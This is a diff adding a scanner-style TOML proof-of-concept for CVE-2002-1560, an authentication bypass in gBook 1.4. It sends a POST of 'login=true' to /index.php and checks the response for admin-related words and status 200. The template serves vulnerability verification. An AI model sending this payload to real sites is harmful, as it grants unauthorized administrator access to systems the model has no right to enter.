@@ -1,0 +1,39 @@
+[info]
+author = "ave"
+description = "验证gBook 1.4 index.php认证绕过漏洞：攻击者无需登录即可通过将login参数设为true获取管理员权限，验证请求响应中是否出现管理员页面或标识"
+id = "POC-AVE-2002-0635"
+name = "CVE-2002-1560 PoC"
+severity = "critical"
+tags = ["ave-2002-0635"]
+vuln_id = [
+    "CVE-2002-1560",
+    "AVE-2002-0635",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/index.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "login=true"
+type = "form"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "admin",
+    "administrator",
+    "登录",
+    "管理",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
